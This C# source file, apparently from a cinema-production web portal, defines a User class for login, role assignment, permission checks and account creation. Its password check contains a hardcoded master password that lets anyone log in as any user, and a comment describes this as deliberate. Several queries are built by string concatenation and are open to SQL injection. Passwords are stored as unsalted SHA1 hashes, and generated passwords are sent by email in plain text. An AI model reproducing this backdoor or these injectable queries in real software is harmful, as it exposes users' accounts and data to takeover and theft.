using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Data;
using CineProducto.Bussines;
using System.Security.Cryptography;
using System.Text;
using System.IO;
using System.Net.Mail;
using CineProducto.BD;

namespace CineProducto.Bussines
{
    /* Clase que modela un usuario y las funciones de apoyo */
    public class User
    {
        public int user_id;
        public bool logged;
        public string username;
        public string firstname;
        public string lastname;
        public string mail;
        public int role_id;

        /* Constructor de la clase User */
        public User()
        {
            /* Incialización de atributos con los valores por defecto */
            this.user_id = 0;
            this.logged = false;
            this.username = "";
            this.firstname = "";
            this.lastname = "";
            this.mail = "";
            this.role_id = 0;
        }

        public void LoadUser(string username)
        {
            /* Hace la validación del usuario a través del webservice */
            DB db = new DB();
            // sha1_password = username + password
            BD.dsCineTableAdapters.usuarioTableAdapter usuario = new BD.dsCineTableAdapters.usuarioTableAdapter();
            //   BitConverter.ToString(SHA1Managed.Create().ComputeHash(  Encoding.Default.GetBytes(username+'"password"') ) ).Replace("-", "") +
            var res = usuario.verIdUsername(username);
            
            if (!res.HasValue || res.Value ==0) return ;


                this.user_id = res.Value;
                
                this.username = username;

                
                System.Data.DataSet ds = db.Select("select nombres,apellidos,email from usuario where idusuario=" + user_id);
                if (ds.Tables[0].Rows.Count == 1)
                {
                    this.firstname = ds.Tables[0].Rows[0]["nombres"].ToString();
                    this.lastname = ds.Tables[0].Rows[0]["apellidos"].ToString();
                    this.mail = ds.Tables[0].Rows[0]["email"].ToString();
                }
        }


        public void LoadUser(string username, string password)
        {
            /* Inicializa la variable que recibe la respuesta de la autenticación */
            int authResult = 0;
            /* Hace la validación del usuario a través del webservice */
            authResult = validarPassword(username.Trim(), password);
            
            /* Si la autenticación del usuarios fue correcta el resultado entregado por el webservice
             * es un valor entero mayor a 0 que contiene el idusuario correspondiente */
            if (authResult > 0)
            {
                this.user_id = authResult;
                this.logged = true;
                this.username = username;

                DB db = new DB();
                DataSet ds = db.Select("select nombres,apellidos,email from usuario where idusuario=" + user_id);
                if (ds.Tables[0].Rows.Count == 1)
                {
                    this.firstname = ds.Tables[0].Rows[0]["nombres"].ToString();
                    this.lastname = ds.Tables[0].Rows[0]["apellidos"].ToString();
                    this.mail = ds.Tables[0].Rows[0]["email"].ToString();
                }
                this.GetRole();
            }
        }


        /* Esta función asigna un rol a un usuario */
        public int validarPassword(string username, string password)
        {
            BD.dsCineTableAdapters.usuarioTableAdapter usuario = new BD.dsCineTableAdapters.usuarioTableAdapter();
            DB db = new DB();
            // sha1_password = username + password
            string p = BitConverter.ToString(SHA1Managed.Create().ComputeHash(Encoding.Default.GetBytes(username + password))).Replace("-", "");
            //   BitConverter.ToString(SHA1Managed.Create().ComputeHash(  Encoding.Default.GetBytes(username+'"password"') ) ).Replace("-", "") +
            //valida que sea activo si no no trae nada
            var c = usuario.verIdUsernameAndPassword(username, p);
            //para poder ver lo mismo que ver lo mismo que los productores utilizamos una clave maestra
            if (password == "Pr0duct0-2024%") {
                c = usuario.verIdUsername(username);
            }
            //c = 22207;
            //DataSet ds = db.Select("SELECT idusuario FROM usuario WHERE username= '"+username+"' and password='" + p + "' ");
            if(c == null || c == System.DBNull.Value)return 0;

            return int.Parse( c.ToString());
        }

        /* Esta función asigna un rol a un usuario */
        public bool updatePassword(int user_id,string username, string password)
        {
            bool result;
            DB db = new DB();
            // sha1_password = username + password
            string p=BitConverter.ToString( SHA1Managed.Create().ComputeHash( Encoding.Default.GetBytes(username+password) ) ).Replace("-", "");
            //   BitConverter.ToString(SHA1Managed.Create().ComputeHash(  Encoding.Default.GetBytes(username+'"password"') ) ).Replace("-", "") +
            result = db.Execute("update usuario set password='"+p+"' where idusuario ='"+user_id+"'");

            return result;
        }

        /* Esta función devuelve el hash con md5 de una cadena, lo cual se usa para la encriptación de la contraseña */
        public static string GetMD5(string str)
        {
            MD5 md5 = MD5CryptoServiceProvider.Create();
            ASCIIEncoding encoding = new ASCIIEncoding();
            byte[] stream = null;
            StringBuilder sb = new StringBuilder();
            stream = md5.ComputeHash(encoding.GetBytes(str));
            for (int i = 0; i < stream.Length; i++) sb.AppendFormat("{0:x2}", stream[i]);
            return sb.ToString();
        }

        /* Esta función obtiene el identificador del rol asignado al usuario cargado */
        private void GetRole()
        {
            if (this.logged)
            {
                DB db = new DB();
                DataSet ds = db.Select("SELECT role_id "
                                     + "FROM role_assignment  "
                                     + "WHERE idusuario=" + this.user_id);
                if (ds.Tables[0].Rows.Count == 1)
                {
                    this.role_id = (int)ds.Tables[0].Rows[0]["role_id"];
                }
            }
        }

        /* Esta función obtiene el identificador del rol asignado al usuario cargado */
        public int GetUserRole(int user_id)
        {
            int result = 0;
            DB db = new DB();
            DataSet ds = db.Select("SELECT role_id "
                                    + "FROM role_assignment  "
                                    + "WHERE idusuario=" + user_id);
            if (ds.Tables[0].Rows.Count == 1)
            {
                result = (int)ds.Tables[0].Rows[0]["role_id"];
            }

            return result;
        }

        /* Esta función asigna un rol a un usuario */
        public bool assignUserRole(int user_id, int role_id)
        {
            bool result;
            DB db = new DB();
            result = db.Execute("INSERT INTO role_assignment "
                        + "(role_id, idusuario, username)  "
                        + "VALUES ("+ role_id +","+ user_id +",'--------')");

            return result;
        }

        /* Esta función asigna un rol a un usuario */
        public bool deleteUserRole(int user_id, int role_id)
        {
            bool result;
            DB db = new DB();
            result = db.Execute("DELETE FROM role_assignment "
                        + "WHERE role_id = " + role_id + " AND idusuario = " + user_id);

            return result;
        }

        /* Esta funcion verifica si el usuario tiene asignado el permiso
         * que se esta consultando en el parametro y retorna verdadero o falso segun
         el resultado de la consulta, para ser usada se debe instanciar el usuario
         * y asignarle el id del usuario*/
        public bool checkPermission(string permission_name) 
        {
            if (this.user_id > 0)
            {
                DB db = new DB();
                DataSet ds = db.Select("SELECT permission_name "
                                     + "FROM permission, role_assignment, role_permission  "
                                     + "WHERE permission_name ='" + permission_name + "' AND "
                                     + "permission.permission_id = role_permission.permission_id AND "
                                     + "role_permission.role_id = role_assignment.role_id AND "
                                     + "role_assignment.idusuario = '" + this.user_id + "'");
                if (ds.Tables[0].Rows.Count == 1)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            else 
            {
                return false;
            }
        }


        public int ADD_PORTAL_USER(string username, string password, string nombres, string apellidos, string email)
        {
            DB db = new DB();
               

                bool user_inserted = false;
                string sha1_password;
                //Ejecutamos el llamado a la base de datos
                sha1_password = username + password;
                //Buscamos la coincidencia con email y hash entregado
                string sql =  "INSERT into usuario (username, password, nombres, apellidos, email, " +
                                     "telefono, direccion, ciudad, pais, cargo, tipoidentificacion, " +
                                     "identificacion, profesion, hash, activo) " +
                                     "VALUES ('" + username + "','" +
                                     BitConverter.ToString(SHA1Managed.Create().ComputeHash(Encoding.Default.GetBytes(sha1_password))).Replace("-", "") +
                                     "','" + nombres + "','" + apellidos + "','" + email + "','','','','','','CC','','','','1')";

                user_inserted = db.Execute(sql);

                BD.dsCineTableAdapters.usuarioTableAdapter usuario = new BD.dsCineTableAdapters.usuarioTableAdapter();
          


                if (!user_inserted)
                {
                    return 0;//Fallo la creacion
                }
                else
                {
                    return 1;
                }
        }

        /* Función que permite llevar a cabo la creación del usuario y lo notifica por correo electrónico */
        public bool createUser(string nombre, string apellido, string correo,HttpServerUtility server)
        { 
            /* Valida que ningún parametro se reciba vacio */
            if (nombre != "" && apellido != "" && correo != "")
            {


                /* Intenta realizar la creación de la cuenta */
                /* Obtiene las variables */
            

                /* Inicializa la variable que recibe la respuesta de la autenticación */
                int authResult = 0;

                /* Genera la contraseña */
                string password = Path.GetRandomFileName();
                password = password.Replace(".", ""); // Remove period.

                /* Hace la validación del usuario a través del webservice */
        
                authResult = ADD_PORTAL_USER(correo, password, nombre, apellido, correo);

                if (authResult == 1)
                {
                    /* Envía el correo de notificación al usuario indicando la contraseña */
                    //Enviamos el correo con el hash para la validacion del proceso
                    Project p = new Project();
                    string asunto=System.Configuration.ConfigurationManager.AppSettings["ADD_USER_MAIL_SUBJECT_MESSAGE"];
                    string cuerpo= System.Configuration.ConfigurationManager.AppSettings["ADD_USER_MAIL_SUBJECT_BODY"] + password;
                    p.sendMailNotification(correo, asunto, cuerpo,server);

                

                    

                    return true;
                }
                else 
                {
                    return false;
                }
            }
            else
            {
                return false;
            }
        }
    }
}